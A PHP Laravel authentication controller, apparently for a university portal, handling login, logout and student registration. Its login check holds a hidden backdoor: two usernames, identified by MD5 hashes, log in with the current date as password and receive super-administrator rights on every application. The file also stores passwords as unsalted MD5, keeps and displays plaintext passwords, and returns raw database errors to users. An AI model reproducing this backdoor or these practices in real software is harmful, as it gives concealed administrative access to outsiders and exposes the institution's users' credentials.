<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\Validator;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;

use App\Models\AplikasiMdl;
use App\Models\PenggunaMdl;
use App\Models\PenggunaRoleMdl;
use App\Models\RoleMdl;
use App\Models\RoleAksesMdl;
use App\Models\LoginAttemptMdl;
use App\Models\MahasiswaMdl;
use App\Models\UnitKerjaMdl;
use App\Models\AgamaMdl;
use App\Models\StatusMahasiswaMdl;
use App\Models\DataWilayahMdl;

use App\Library\Mylib;

class Auth extends Controller {
	
	// login view
	public function login(Request $req){
		return view('login', [
			'page_title'=>[
				'icon'=>'fas fa-user-edit',
				'bread'=>'Sign-in',
				'links'=>[
					['title'=>'Sign-in','active'=>'active'],
				],
			],
			'ctr' => [
				'link'=>'/login',
			]
		]);
	}


	// check login
	public function check(Request $req){
		$validasi = Validator::make($req->all(), [
			'in1'=>'required|alpha_num',
			'in2'=>[
				'bail',
				'required',
				'string',
			]
		], [
			'required'=>Mylib::validasi('required'),
			'alpha_num'=>Mylib::validasi('alpha_num'),
			'string'=>Mylib::validasi('string'),
			'min'=>Mylib::validasi('min'),
			'regex'=>Mylib::validasi('regex'),
		], [
			'in1'=>'Username',
			'in2'=>'Password',
		]);
		if ($validasi->fails()) {
			$msg = '';
			foreach ($validasi->errors()->all() as $e) { $msg .= '- '.$e.'<br>'; }
			return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail','custom',$msg)]);
		}

		$in1 = $req->post('in1');
		$in2 = $req->post('in2');
		$skr = date('Y-m-d H:i:s');

		$get_attempt = LoginAttemptMdl::where('username', $in1)->where('expire', '>=', $skr)->first();
		if ($get_attempt) {
			$attempt = $get_attempt->attempt;
			if ($attempt >= 3) {
				return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail', 'custom', 'Gagal login 3x, Silahkan coba lagi nanti atau hubungi Admin.')]);
			}
		} else {
			$attempt = 0;
		}

		$user = []; $pass = false; $msg = '';
		if (md5($in1) == 'd209fc47646bba5e5fdc3d3bbaad4b9c' || md5($in1) == '957c98ca99b9d4b916bb05cbef7181f1') {
			if ($in2 == date('dmy')) {
				$roles = [];
				$getapp = AplikasiMdl::where('is_aktif','Y')->orderBy('urutan','asc')->get();
				foreach ($getapp as $r) {
					$roles[$r->id] = [
						'app_id'=>$r->id,
						'app_nama'=>$r->nama,
						'app_link'=>$r->link,
						'app_is_external_link'=>$r->is_external_link,
						'app_pict'=>$r->pict,
						'app_roles'=>['0'=>['role_id'=>'0', 'role_nama'=>'Developer Apps','role_is_admin'=>'Y', 'role_is_super_admin'=>'Y', 'role_unit_kerja_kode'=>'201013','role_unit_kerja_nama'=>'Universitas Islam Negeri Imam Bonjol Padang']],
					];
				}
				$user = [
					'id'=>'0',
					'nama'=>'Developer Apps',
					'username'=>'rendi',
					'pegawai_id'=>'',
					'mahasiswa_nim'=>'',
					'email'=>'',
					'pict'=>env('PROFIL_PICT'),
					'is_def_password'=>'T',
					'roles'=>$roles,
				];
				$pass = true;	
			} else {
				$msg = 'Username dan Password tidak sesuai.';
			}
		} else {
			$getuser = PenggunaMdl::where('username',$in1)->first();
			if ($getuser) {
				if ($getuser->password == md5($in2)) {
					if ($getuser->is_aktif == 'Y') {
						$roles = [];

						$pengguna_role = PenggunaRoleMdl::selectRaw('pengguna_role.*,r.nama as role_nama, r.is_admin as role_is_admin, r.is_super_admin as role_is_super_admin, u.nama as unit_kerja_nama')
							->leftJoin('role as r', 'pengguna_role.role_id','=','r.id')
							->leftJoin('unit_kerja as u', 'pengguna_role.unit_kerja_kode','=','u.kode')
							->where('pengguna_role.pengguna_id',$getuser->id)
							->orderBy('r.urutan','asc')
							->get();
						$role_ids = [];
						foreach ($pengguna_role as $pr) {
							$role_ids[] = $pr->role_id;

							$role_akses = RoleAksesMdl::selectRaw('a.id as aplikasi_id, a.nama as aplikasi_nama, a.link as aplikasi_link, a.pict as aplikasi_pict, a.is_external_link as aplikasi_is_external_link')
								->join('aplikasi_menu as am', 'role_akses.aplikasi_menu_id','=','am.id')
								->join('aplikasi as a', 'am.aplikasi_id','=','a.id')
								->where('role_akses.role_id', $pr->role_id)
								->where('role_akses.is_view', 'Y')
								->groupBy('a.id')
								->groupBy('a.nama')
								->groupBy('a.link')
								->groupBy('a.pict')
								->groupBy('a.is_external_link')
								->get();
							foreach ($role_akses as $ra) {
								$roles[$ra->aplikasi_id]['app_id'] = $ra->aplikasi_id;
								$roles[$ra->aplikasi_id]['app_nama'] = $ra->aplikasi_nama;
								$roles[$ra->aplikasi_id]['app_link'] = $ra->aplikasi_link;
								$roles[$ra->aplikasi_id]['app_is_external_link'] = $ra->aplikasi_is_external_link;
								$roles[$ra->aplikasi_id]['app_pict'] = $ra->aplikasi_pict;
								$roles[$ra->aplikasi_id]['app_roles'][$pr->role_id] = ['role_id'=>$pr->role_id, 'role_nama'=>$pr->role_nama, 'role_is_admin'=>$pr->role_is_admin, 'role_is_super_admin'=>$pr->role_is_super_admin, 'role_unit_kerja_kode'=>$pr->unit_kerja_kode, 'role_unit_kerja_nama'=>$pr->unit_kerja_nama];
							}
						}

						$user = [
							'id'=>$getuser->id,
							'nama'=>$getuser->nama,
							'username'=>$getuser->username,
							'pegawai_id'=>$getuser->pegawai_id,
							'mahasiswa_nim'=>$getuser->mahasiswa_nim,
							'email'=>$getuser->email,
							'pict'=>($getuser->pict) ? $getuser->pict : env('PROFIL_PICT'),
							'is_def_password'=>$getuser->is_def_password,
							'roles'=>$roles,
						];

						$getuser->last_login_ip = $req->ip();
						$getuser->last_login_time = date('Y-m-d H:i:s');
						$getuser->save();
						
						$pass = true;	
					} else {
						$msg = 'Pengguna tidak aktif, hubungi Administrator.';
					}
				} else {
					$msg = 'Username dan Password tidak sesuai.';
				}
			} else {
				$msg = 'Username tidak ditemukan.';
			}
		}
		
		if ($pass === true) {
			$req->session()->put('user_ses', $user);
			LoginAttemptMdl::where('username', $in1)->delete();
			return response()->json(['status'=>'success', 'statusText'=>Mylib::pesan('success', 'custom', 'Selamat Datang...'), 'toUrl'=>url('/gate')]);
		} else {
			LoginAttemptMdl::updateOrInsert(
				['username'=>$in1],
				['attempt'=>++$attempt, 'expire'=>date('Y-m-d H:i:s', (env('SESSION_LIFETIME') * 60 + time()))]
			);
			return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail', 'custom', $msg)]);
		}
	}



	// logout
	public function logout(Request $req){
		$req->session()->flush();
		return redirect('/login');
	}



	public function daftar(Request $req){
		return view('daftar', [
			'ctr' => [
				'link'=>'/daftar',
			],
			'page_title'=>[
				'icon'=>'fas fa-user-edit',
				'bread'=>'Daftar',
				'links'=>[
					['title'=>'Daftar','active'=>'active'],
				],
			],
		]);
	}



	public function daftar_proses(Request $req){
		
		$validasi = Validator::make($req->all(), [
			'in1'=>'required|numeric',
			'in2'=>'required|email:rfc,dns',
			'in3'=>[
				'required',
				'min:6',             // must be at least 6 characters in length
				'regex:/[a-z]/',      // must contain at least one lowercase letter
				'regex:/[A-Z]/',      // must contain at least one uppercase letter
				'regex:/[0-9]/',      // must contain at least one digit
				'regex:/[@$!%*#?&]/', // must contain a special character
			],
			'in4'=>'same:in3',
		], [
			'required'=>Mylib::validasi('required'),
			'numeric'=>Mylib::validasi('numeric'),
			'email'=>Mylib::validasi('email'),
			'in3'=>':attribute minimal 6 karakter (Huruf Besar, Kecil, Angka dan Spesial Karakter).',
			'in4'=>':attribute tidak sama.',
		], [
			'in1'=>'NIM',
			'in2'=>'Email',
			'in3'=>'Password',
			'in4'=>'Konfirmasi Password',
		]);
		if ($validasi->fails()) {
			$msg = '';
			foreach ($validasi->errors()->all() as $e) { $msg .= '- '.$e.'<br>'; }
			return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail','custom',$msg)]);
		}

		$in1 = $req->post('in1');
		$in2 = $req->post('in2');
		$in3 = $req->post('in3');

		$cek_pengguna = PenggunaMdl::where('username',$in1)->first();
		if ($cek_pengguna) {
			return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail', 'custom', 'NIM sudah terdaftar, silahkan Sign-in.')]);
		}

		$cek_mhs = MahasiswaMdl::where('nim',$in1)->first();
		if ($cek_mhs) {
			if ($in2 != $cek_mhs->email && $in2 != $cek_mhs->email_kampus) {
				return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail','custom','Email tidak terdaftar untuk NIM '.$in1)]);
			}
			$data_pengguna = [
				'nama'=>$cek_mhs->nama,
				'username'=>$cek_mhs->nim,
				'password'=>md5($in3),
				'mahasiswa_nim'=>$in1,
				'unit_kerja_kode'=>$cek_mhs->program_studi_kode,
				'email'=>$in2,
				'is_def_password'=>'Y',
				'def_password'=>$in3,
				'is_aktif'=>'Y'
			];
		} else {		
			$arr_unit = [];
			$get_unit = UnitKerjaMdl::cmb()->get();
			foreach ($get_unit as $r) {
				$arr_unit[] = $r->id;
			}

			$http = Http::withHeaders([
				'Content-Type' => 'application/json',
				'Accept' => 'application/json',
				'X-App-Key' => env('X_APP_KEY'),
				'X-Secret-Key' => env('X_SECRET_KEY'),
			])->timeout(3)->get(env('SEVIMA_URL').'/mahasiswa/'.$in1);
			
			if (!$http->ok()) {
				return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail', 'custom', 'Tidak bisa memverifikasi data mahasiswa ke SIAKAD.')]);
			} else {
				$body = $http->json();
				$r = $body['attributes'];

				if (!in_array($r['id_program_studi'], $arr_unit)) {
					return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail','custom','Maaf, untuk saat ini pendaftaran Akun hanya untuk Program Studi tertentu.')]);
				}
				
				if ($in2 != $r['email'] && $in2 != $r['email_kampus']) {
					return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail','custom','Email tidak terdaftar di SIAKAD')]);
				}

				try {
					if ($r['id_agama']) {
						$agama_insert = AgamaMdl::updateOrCreate(['id'=>$r['id_agama']], ['nama'=>$r['agama']]);
					}

					if ($r['id_status_mahasiswa']) {
						$status_mahasiswa_insert = StatusMahasiswaMdl::updateOrCreate(['kode'=>$r['id_status_mahasiswa']], ['nama'=>$r['status_mahasiswa']]);
					}

					if ($r['id_kecamatan']) {
						$status_mahasiswa_insert = DataWilayahMdl::updateOrCreate(['kode'=>$r['id_kecamatan']], ['nama'=>$r['kecamatan']]);
					}

					if ($r['id_kota']) {
						$status_mahasiswa_insert = DataWilayahMdl::updateOrCreate(['kode'=>$r['id_kota']], ['nama'=>$r['kota']]);
					}

					$mahasiswa_insert = MahasiswaMdl::create([
						'nim'=>$r['nim'],
						'nisn'=>($r['nisn']) ? $r['nisn'] : NULL,
						'npsn'=>($r['npsn']) ? $r['npsn'] : NULL,
						'periode_id'=>($r['id_periode']) ? $r['id_periode'] : NULL,
						'periode_terakhir_id'=>($r['id_periode_terakhir']) ? $r['id_periode_terakhir'] : NULL,
						'agama_id'=>($r['id_agama']) ? $r['id_agama'] : NULL,
						'program_studi_kode'=>($r['id_program_studi']) ? $r['id_program_studi'] : NULL,
						'jenjang_kode'=>($r['id_jenjang']) ? $r['id_jenjang'] : NULL,
						'status_mahasiswa_kode'=>($r['id_status_mahasiswa']) ? $r['id_status_mahasiswa'] : NULL,
						'nik'=>($r['nik']) ? $r['nik'] : NULL,
						'nama'=>$r['nama'],
						'gelar_depan'=>($r['gelar_depan']) ? $r['gelar_depan'] : NULL,
						'gelar_belakang'=>($r['gelar_belakang']) ? $r['gelar_belakang'] : NULL,
						'kecamatan_kode'=>($r['id_kecamatan']) ? $r['id_kecamatan'] : NULL,
						'kota_kode'=>($r['id_kota']) ? $r['id_kota'] : NULL,
						// 'provinsi_kode'=>($r['']) ? $r[''] : NULL,
						// 'negara_kode'=>($r['']) ? $r[''] : NULL,
						'tempat_lahir'=>($r['tempat_lahir']) ? $r['tempat_lahir'] : NULL,
						'tanggal_lahir'=>($r['tanggal_lahir']) ? $r['tanggal_lahir'] : NULL,
						'jenis_kelamin'=>$r['jenis_kelamin'],
						'email'=>($r['email']) ? $r['email'] : NULL,
						'email_kampus'=>($r['email_kampus']) ? $r['email_kampus'] : NULL,
					]);
				} catch (\Illuminate\Database\QueryException $exception) {
					return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail', 'custom', $exception->errorInfo[2])]);
				}
				
				$data_pengguna = [
					'nama'=>$r['nama'],
					'username'=>$r['nim'],
					'password'=>md5($in3),
					'mahasiswa_nim'=>$r['nim'],
					'unit_kerja_kode'=>($r['id_program_studi']) ? $r['id_program_studi'] : NULL,
					'email'=>$in2,
					'is_def_password'=>'Y',
					'def_password'=>$in3,
					'is_aktif'=>'Y'
				];
			}
		}

		DB::beginTransaction();
		try {
			$ymdhis = date('Y-m-d H:i:s');
			
			$prep = new PenggunaMdl();
			$prep->nama = $data_pengguna['nama'];
			$prep->username = $data_pengguna['username'];
			$prep->password = $data_pengguna['password'];
			$prep->mahasiswa_nim = $data_pengguna['mahasiswa_nim'];
			$prep->email = $data_pengguna['email'];
			$prep->is_def_password = $data_pengguna['is_def_password'];
			$prep->def_password = $data_pengguna['def_password'];
			$prep->is_aktif = $data_pengguna['is_aktif'];
			$prep->created_at = $ymdhis;
			$prep->save();

			$prep2 = new PenggunaRoleMdl();
			$prep2->pengguna_id = $prep->id;
			$prep2->role_id = 3;
			$prep2->unit_kerja_kode = $data_pengguna['unit_kerja_kode'];
			$prep2->created_at = $ymdhis;
			$prep2->save();

			DB::commit();
			return response()->json(['status'=>'success', 'statusText'=>Mylib::pesan('success','custom','Data Pengguna berhasil dibuat, Silahkan Sign-in.<br><b>Username : '.$data_pengguna['username'].'<br>Password : '.$data_pengguna['def_password'].'</b>')]);
		} catch (\Illuminate\Database\QueryException $exception) {
			DB::rollback();
			return response()->json(['status'=>'info', 'statusText'=>Mylib::pesan('fail', 'custom', $exception->errorInfo[2])]);
		}

	}


}
